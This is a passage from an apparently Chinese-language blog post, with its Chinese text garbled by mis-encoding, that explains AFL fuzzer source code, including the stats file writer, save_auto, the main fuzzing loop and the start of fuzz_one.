class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(f, <span class="string">&quot;start_time        : %llu\n&quot;</span></span><br><span class="line">             <span class="string">&quot;last_update       : %llu\n&quot;</span></span><br><span class="line">             <span class="string">&quot;fuzzer_pid        : %u\n&quot;</span></span><br><span class="line">             <span class="string">&quot;cycles_done       : %llu\n&quot;</span></span><br><span class="line">             <span class="string">&quot;execs_done        : %llu\n&quot;</span></span><br><span class="line">             <span class="string">&quot;execs_per_sec     : %0.02f\n&quot;</span></span><br><span class="line">             <span class="string">&quot;paths_total       : %u\n&quot;</span></span><br><span class="line">             <span class="string">&quot;paths_favored     : %u\n&quot;</span></span><br><span class="line">             <span class="string">&quot;paths_found       : %u\n&quot;</span></span><br><span class="line">             <span class="string">&quot;paths_imported    : %u\n&quot;</span></span><br><span class="line">             <span class="string">&quot;max_depth         : %u\n&quot;</span></span><br><span class="line">             <span class="string">&quot;cur_path          : %u\n&quot;</span> <span class="comment">/* Must match find_start_position() */</span></span><br><span class="line">             <span class="string">&quot;pending_favs      : %u\n&quot;</span></span><br><span class="line">             <span class="string">&quot;pending_total     : %u\n&quot;</span></span><br><span class="line">             <span class="string">&quot;variable_paths    : %u\n&quot;</span></span><br><span class="line">             <span class="string">&quot;stability         : %0.02f%%\n&quot;</span></span><br><span class="line">             <span class="string">&quot;bitmap_cvg        : %0.02f%%\n&quot;</span></span><br><span class="line">             <span class="string">&quot;unique_crashes    : %llu\n&quot;</span></span><br><span class="line">             <span class="string">&quot;unique_hangs      : %llu\n&quot;</span></span><br><span class="line">             <span class="string">&quot;last_path         : %llu\n&quot;</span></span><br><span class="line">             <span class="string">&quot;last_crash        : %llu\n&quot;</span></span><br><span class="line">             <span class="string">&quot;last_hang         : %llu\n&quot;</span></span><br><span class="line">             <span class="string">&quot;execs_since_crash : %llu\n&quot;</span></span><br><span class="line">             <span class="string">&quot;exec_timeout      : %u\n&quot;</span> <span class="comment">/* Must match find_timeout() */</span></span><br><span class="line">             <span class="string">&quot;afl_banner        : %s\n&quot;</span></span><br><span class="line">             <span class="string">&quot;afl_version       : &quot;</span> VERSION <span class="string">&quot;\n&quot;</span></span><br><span class="line">             <span class="string">&quot;target_mode       : %s%s%s%s%s%s%s\n&quot;</span></span><br><span class="line">             <span class="string">&quot;command_line      : %s\n&quot;</span></span><br><span class="line">             <span class="string">&quot;slowest_exec_ms   : %llu\n&quot;</span>,</span><br><span class="line">             start_time / <span class="number">1000</span>, <span class="built_in">get_cur_time</span>() / <span class="number">1000</span>, <span class="built_in">getpid</span>(),</span><br><span class="line">             queue_cycle ? (queue_cycle - <span class="number">1</span>) : <span class="number">0</span>, total_execs, eps,</span><br><span class="line">             queued_paths, queued_favored, queued_discovered, queued_imported,</span><br><span class="line">             max_depth, current_entry, pending_favored, pending_not_fuzzed,</span><br><span class="line">             queued_variable, stability, bitmap_cvg, unique_crashes,</span><br><span class="line">             unique_hangs, last_path_time / <span class="number">1000</span>, last_crash_time / <span class="number">1000</span>,</span><br><span class="line">             last_hang_time / <span class="number">1000</span>, total_execs - last_crash_execs,</span><br><span class="line">             exec_tmout, use_banner,</span><br><span class="line">             qemu_mode ? <span class="string">&quot;qemu &quot;</span> : <span class="string">&quot;&quot;</span>, dumb_mode ? <span class="string">&quot; dumb &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">             no_forkserver ? <span class="string">&quot;no_forksrv &quot;</span> : <span class="string">&quot;&quot;</span>, crash_mode ? <span class="string">&quot;crash &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">             persistent_mode ? <span class="string">&quot;persistent &quot;</span> : <span class="string">&quot;&quot;</span>, deferred_mode ? <span class="string">&quot;deferred &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">             (qemu_mode || dumb_mode || no_forkserver || crash_mode ||</span><br><span class="line">              persistent_mode || deferred_mode) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;default&quot;</span>,</span><br><span class="line">             orig_cmdline, slowest_exec_ms);</span><br><span class="line">             <span class="comment">/* ignore errors */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Get rss value from the children</span></span><br><span class="line"><span class="comment">     We must have killed the forkserver process and called waitpid</span></span><br><span class="line"><span class="comment">     before calling getrusage */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getrusage</span>(RUSAGE_CHILDREN, &amp;usage)) &#123;</span><br><span class="line">      <span class="built_in">WARNF</span>(<span class="string">&quot;getrusage failed&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (usage.ru_maxrss == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(f, <span class="string">&quot;peak_rss_mb       : not available while afl is running\n&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line">    <span class="built_in">fprintf</span>(f, <span class="string">&quot;peak_rss_mb       : %zu\n&quot;</span>, usage.ru_maxrss &gt;&gt; <span class="number">20</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="built_in">fprintf</span>(f, <span class="string">&quot;peak_rss_mb       : %zu\n&quot;</span>, usage.ru_maxrss &gt;&gt; <span class="number">10</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^__APPLE__ */</span></span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fclose</span>(f);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç»Ÿè®¡çš„ä¿¡æ¯ï¼š</strong> </p><p>æ—¶é—´ç›¸å…³ï¼š</p><ul><li><p><code>start_time</code>: å¼€å§‹æ—¶é—´ï¼ˆUnixæ—¶é—´æˆ³ï¼‰</p></li><li><p><code>last_update</code>: æœ€åæ›´æ–°æ—¶é—´</p></li><li><p><code>exec_timeout</code>: æ‰§è¡Œè¶…æ—¶è®¾ç½®</p></li></ul><p>æ‰§è¡Œç»Ÿè®¡ï¼š</p><ul><li><p><code>execs_done</code>: æ€»æ‰§è¡Œæ¬¡æ•°</p></li><li><p><code>execs_per_sec</code>: æ¯ç§’æ‰§è¡Œæ•°</p></li><li><p><code>cycles_done</code>: å®Œæˆçš„é˜Ÿåˆ—å¾ªç¯æ•°</p></li></ul><p>è·¯å¾„å‘ç°ï¼š</p><ul><li><p><code>paths_total</code>: é˜Ÿåˆ—ä¸­æ€»è·¯å¾„æ•°</p></li><li><p><code>paths_favored</code>: ä¼˜é€‰è·¯å¾„æ•°</p></li><li><p><code>paths_found</code>: æœ¬åœ°å‘ç°çš„è·¯å¾„</p></li><li><p><code>paths_imported</code>: ä»å…¶ä»–å®ä¾‹å¯¼å…¥çš„è·¯å¾„</p></li></ul><p>è¦†ç›–ç‡ä¸ç¨³å®šæ€§ï¼š</p><ul><li><p><code>bitmap_cvg</code>: ä½å›¾è¦†ç›–ç‡</p></li><li><p><code>stability</code>: æ‰§è¡Œç¨³å®šæ€§</p></li><li><p><code>variable_paths</code>: è¡¨ç°ä¸ç¨³å®šçš„æµ‹è¯•æ¡ˆä¾‹æ•°</p></li></ul><p>å´©æºƒä¸æŒ‚èµ·ï¼š</p><ul><li><p><code>unique_crashes</code>: å”¯ä¸€å´©æºƒæ•°</p></li><li><p><code>unique_hangs</code>: å”¯ä¸€æŒ‚èµ·æ•°</p></li><li><p><code>last_crash</code>&#x2F;<code>last_hang</code>: æœ€åå´©æºƒ&#x2F;æŒ‚èµ·æ—¶é—´</p></li></ul><h2 id="save-auto"><a href="#save-auto" class="headerlink" title="save_auto"></a>save_auto</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">save_auto</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u32 i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!auto_changed) <span class="keyword">return</span>;</span><br><span class="line">  auto_changed = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">MIN</span>(USE_AUTO_EXTRAS, a_extras_cnt); i++) &#123;</span><br><span class="line"></span><br><span class="line">    u8* fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/queue/.state/auto_extras/auto_%06u&quot;</span>, out_dir, i);</span><br><span class="line">    s32 fd;</span><br><span class="line"></span><br><span class="line">    fd = <span class="built_in">open</span>(fn, O_WRONLY | O_CREAT | O_TRUNC, <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ck_write</span>(fd, a_extras[i].data, a_extras[i].len, fn);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">    <span class="built_in">ck_free</span>(fn);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åªä¿å­˜å‰<code>MIN(USE_AUTO_EXTRAS, a_extras_cnt)</code>ä¸ª<code>auto extras</code></p><p>Auto extras æ˜¯ AFL åœ¨æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ä¸­è‡ªåŠ¨å‘ç°çš„æœ‰ä»·å€¼çš„å­—èŠ‚åºåˆ—ï¼Œè¿™äº›åºåˆ—ï¼š</p><ul><li><p>åœ¨æµ‹è¯•ç”¨ä¾‹ä¸­é¢‘ç¹å‡ºç°</p></li><li><p>å¯èƒ½è§¦å‘ç¨‹åºçš„ä¸åŒæ‰§è¡Œè·¯å¾„</p></li><li><p>ç”¨äºåç»­çš„å˜å¼‚æ“ä½œä¸­ï¼Œæé«˜å‘ç°æ–°è·¯å¾„çš„æ•ˆç‡</p></li></ul><h2 id="éƒ¨åˆ†mainå‡½æ•°"><a href="#éƒ¨åˆ†mainå‡½æ•°" class="headerlink" title="éƒ¨åˆ†mainå‡½æ•°"></a>éƒ¨åˆ†mainå‡½æ•°</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (stop_soon) <span class="keyword">goto</span> stop_fuzzing;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Woop woop woop */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!not_on_tty) &#123;</span><br><span class="line">    <span class="built_in">sleep</span>(<span class="number">4</span>);</span><br><span class="line">    start_time += <span class="number">4000</span>;</span><br><span class="line">    <span class="keyword">if</span> (stop_soon) <span class="keyword">goto</span> stop_fuzzing;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">    u8 skipped_fuzz;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cull_queue</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!queue_cur) &#123;</span><br><span class="line"></span><br><span class="line">      queue_cycle++;</span><br><span class="line">      current_entry     = <span class="number">0</span>;</span><br><span class="line">      cur_skipped_paths = <span class="number">0</span>;</span><br><span class="line">      queue_cur         = queue;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (seek_to) &#123;</span><br><span class="line">        current_entry++;</span><br><span class="line">        seek_to--;</span><br><span class="line">        queue_cur = queue_cur-&gt;next;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">show_stats</span>();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (not_on_tty) &#123;</span><br><span class="line">        <span class="built_in">ACTF</span>(<span class="string">&quot;Entering queue cycle %llu.&quot;</span>, queue_cycle);</span><br><span class="line">        <span class="built_in">fflush</span>(stdout);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* If we had a full queue cycle with no new finds, try</span></span><br><span class="line"><span class="comment">         recombination strategies next. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (queued_paths == prev_queued) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (use_splicing) cycles_wo_finds++; <span class="keyword">else</span> use_splicing = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">else</span> cycles_wo_finds = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      prev_queued = queued_paths;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (sync_id &amp;&amp; queue_cycle == <span class="number">1</span> &amp;&amp; <span class="built_in">getenv</span>(<span class="string">&quot;AFL_IMPORT_FIRST&quot;</span>))</span><br><span class="line">        <span class="built_in">sync_fuzzers</span>(use_argv);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    skipped_fuzz = <span class="built_in">fuzz_one</span>(use_argv);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!stop_soon &amp;&amp; sync_id &amp;&amp; !skipped_fuzz) &#123;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (!(sync_interval_cnt++ % SYNC_INTERVAL))</span><br><span class="line">        <span class="built_in">sync_fuzzers</span>(use_argv);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!stop_soon &amp;&amp; exit_1) stop_soon = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stop_soon) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    queue_cur = queue_cur-&gt;next;</span><br><span class="line">    current_entry++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (queue_cur) <span class="built_in">show_stats</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we stopped programmatically, we kill the forkserver and the current runner. </span></span><br><span class="line"><span class="comment">     If we stopped manually, this is done by the signal handler. */</span></span><br><span class="line">  <span class="keyword">if</span> (stop_soon == <span class="number">2</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (child_pid &gt; <span class="number">0</span>) <span class="built_in">kill</span>(child_pid, SIGKILL);</span><br><span class="line">      <span class="keyword">if</span> (forksrv_pid &gt; <span class="number">0</span>) <span class="built_in">kill</span>(forksrv_pid, SIGKILL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* Now that we&#x27;ve killed the forkserver, we wait for it to be able to get rusage stats. */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">waitpid</span>(forksrv_pid, <span class="literal">NULL</span>, <span class="number">0</span>) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">WARNF</span>(<span class="string">&quot;error waitpid\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">write_bitmap</span>();</span><br><span class="line">  <span class="built_in">write_stats_file</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">save_auto</span>();</span><br><span class="line"></span><br><span class="line">stop_fuzzing:</span><br><span class="line"></span><br><span class="line">  <span class="built_in">SAYF</span>(CURSOR_SHOW cLRD <span class="string">&quot;\n\n+++ Testing aborted %s +++\n&quot;</span> cRST,</span><br><span class="line">       stop_soon == <span class="number">2</span> ? <span class="string">&quot;programmatically&quot;</span> : <span class="string">&quot;by user&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Running for more than 30 minutes but still doing first cycle? */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (queue_cycle == <span class="number">1</span> &amp;&amp; <span class="built_in">get_cur_time</span>() - start_time &gt; <span class="number">30</span> * <span class="number">60</span> * <span class="number">1000</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span> cYEL <span class="string">&quot;[!] &quot;</span> cRST</span><br><span class="line">           <span class="string">&quot;Stopped during the first cycle, results may be incomplete.\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    (For info on resuming, see %s/README.)\n&quot;</span>, doc_path);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cull_queue</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!queue_cur) &#123;</span><br><span class="line">  queue_cycle++;</span><br><span class="line">  current_entry = <span class="number">0</span>;</span><br><span class="line">  cur_skipped_paths = <span class="number">0</span>;</span><br><span class="line">  queue_cur = queue;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">while</span> (seek_to) &#123;</span><br><span class="line">    current_entry++;</span><br><span class="line">    seek_to--;</span><br><span class="line">    queue_cur = queue_cur-&gt;next;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆè°ƒç”¨<code>cull_queue</code>å‡½æ•°æ‰¾å‡ºæœ€ä¼˜æ ·ä¾‹é›†åˆï¼Œå½“queue_curä¸ºç©ºæ—¶ï¼Œè¡¨ç¤ºå®Œæˆäº†ä¸€è½®é˜Ÿåˆ—éå†</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (queued_paths == prev_queued) &#123;</span><br><span class="line">  <span class="keyword">if</span> (use_splicing) cycles_wo_finds++; <span class="keyword">else</span> use_splicing = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> cycles_wo_finds = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">prev_queued = queued_paths;</span><br></pre></td></tr></table></figure><p>å¦‚æœå®Œæ•´ä¸€è½®é˜Ÿåˆ—å¾ªç¯åæ²¡æœ‰å‘ç°æ–°è·¯å¾„ï¼ˆqueued_paths &#x3D;&#x3D; prev_queuedï¼‰ï¼š</p><ul><li>å¯ç”¨æ‹¼æ¥ï¼ˆsplicingï¼‰ç­–ç•¥ï¼šå°†ä¸åŒæµ‹è¯•ç”¨ä¾‹çš„ç‰‡æ®µç»„åˆ</li><li>å¢åŠ æ— å‘ç°å¾ªç¯è®¡æ•°å™¨</li></ul><p>å¦‚æœæœ‰æ–°å‘ç°ï¼Œé‡ç½®æ— å‘ç°è®¡æ•°å™¨</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (sync_id &amp;&amp; queue_cycle == <span class="number">1</span> &amp;&amp; <span class="built_in">getenv</span>(<span class="string">&quot;AFL_IMPORT_FIRST&quot;</span>))</span><br><span class="line">  <span class="built_in">sync_fuzzers</span>(use_argv);</span><br></pre></td></tr></table></figure><p>å¦‚æœè®¾ç½®äº†<code>AFL_IMPORT_FIRST</code>ä¸”æ˜¯é¦–æ¬¡å¾ªç¯ï¼Œåˆ™ä¸å…¶ä»–fuzzerå®ä¾‹åŒæ­¥</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skipped_fuzz = <span class="built_in">fuzz_one</span>(use_argv);</span><br></pre></td></tr></table></figure><p>fuzz_oneå‡½æ•°æ˜¯AFLçš„æ ¸å¿ƒï¼Œå¯¹å½“å‰é˜Ÿåˆ—æ¡ç›®æ‰§è¡Œå„ç§å˜å¼‚ç­–ç•¥ï¼š</p><ul><li><p>ä½ç¿»è½¬ï¼ˆbit flipsï¼‰</p></li><li><p>å­—èŠ‚ç¿»è½¬ï¼ˆbyte flipsï¼‰</p></li><li><p>ç®—æœ¯è¿ç®—ï¼ˆarithmeticï¼‰</p></li><li><p>å·²çŸ¥æœ‰è¶£å€¼ï¼ˆknown integersï¼‰</p></li><li><p>å­—å…¸æ”»å‡»ï¼ˆdictionaryï¼‰</p></li><li><p>éšæœºç ´åï¼ˆhavocï¼‰</p></li><li><p>æ‹¼æ¥ï¼ˆsplicingï¼‰</p></li></ul><p>è¿™æ˜¯æ ¸å¿ƒå‡½æ•°ï¼Œä¹‹ååˆ†æ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!stop_soon &amp;&amp; sync_id &amp;&amp; !skipped_fuzz) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!(sync_interval_cnt++ % SYNC_INTERVAL))</span><br><span class="line">    <span class="built_in">sync_fuzzers</span>(use_argv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨å¤šå®ä¾‹æ¨¡å¼ä¸‹ï¼Œæ‰ä¼šè¿›è¡ŒåŒæ­¥</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">queue_cur = queue_cur-&gt;next;</span><br><span class="line">current_entry++;</span><br></pre></td></tr></table></figure><p>ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªé˜Ÿåˆ—</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (stop_soon == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (child_pid &gt; <span class="number">0</span>) <span class="built_in">kill</span>(child_pid, SIGKILL);</span><br><span class="line">    <span class="keyword">if</span> (forksrv_pid &gt; <span class="number">0</span>) <span class="built_in">kill</span>(forksrv_pid, SIGKILL);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">waitpid</span>(forksrv_pid, <span class="literal">NULL</span>, <span class="number">0</span>) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="built_in">WARNF</span>(<span class="string">&quot;error waitpid\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>stop_soon &#x3D;&#x3D; 2ï¼šç¨‹åºåŒ–åœæ­¢ï¼ˆéç”¨æˆ·æ‰‹åŠ¨åœæ­¢ï¼‰</p></li><li><p>ç»ˆæ­¢å­è¿›ç¨‹å’ŒforkæœåŠ¡å™¨è¿›ç¨‹</p></li><li><p>ç­‰å¾…forkæœåŠ¡å™¨è¿›ç¨‹ç»“æŸä»¥è·å–èµ„æºä½¿ç”¨ç»Ÿè®¡</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">write_bitmap</span>();</span><br><span class="line"><span class="built_in">write_stats_file</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">save_auto</span>();</span><br></pre></td></tr></table></figure><p>è®°å½•ä½å›¾ï¼ŒçŠ¶æ€æ–‡ä»¶å’Œè‡ªåŠ¨æå–çš„å­—å…¸</p><h2 id="fuzz-one"><a href="#fuzz-one" class="headerlink" title="fuzz_one"></a>fuzz_one</h2><h3 id="åˆå§‹åŒ–"><a href="#åˆå§‹åŒ–" class="headerlink" title="åˆå§‹åŒ–"></a>åˆå§‹åŒ–</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä¼˜å…ˆå¤„ç†favoredæ¡ç›®</span></span><br><span class="line"><span class="keyword">if</span> (pending_favored) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((queue_cur-&gt;was_fuzzed || !queue_cur-&gt;favored) &amp;&amp;</span><br><span class="line">        <span class="built_in">UR</span>(<span class="number">100</span>) &lt; SKIP_TO_NEW_PROB) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¦‚ç‡æ€§è·³è¿‡éfavoredæ¡ç›®</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!dumb_mode &amp;&amp; !queue_cur-&gt;favored &amp;&amp; queued_paths &gt; <span class="number">10</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (queue_cycle &gt; <span class="number">1</span> &amp;&amp; !queue_cur-&gt;was_fuzzed) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">UR</span>(<span class="number">100</span>) &lt; SKIP_NFAV_NEW_PROB) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">UR</span>(<span class="number">100</span>) &lt; SKIP_NFAV_OLD_PROB) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å°†æµ‹è¯•ç”¨ä¾‹æ˜ å°„åˆ°å†…å­˜</span></span><br><span class="line">fd = <span class="built_in">open</span>(queue_cur-&gt;fname, O_RDONLY);</span><br><span class="line">orig_in = in_buf = <span class="built_in">mmap</span>(<span class="number">0</span>, len, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, <span class="number">0</span>);</span><br><span class="line">out_buf = <span class="built_in">ck_alloc_nozero</span>(len);</span><br></pre></td></tr></table></figure><p>å°†æµ‹è¯•ç”¨ä¾‹æ˜ å°„åˆ°å†…å­˜</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 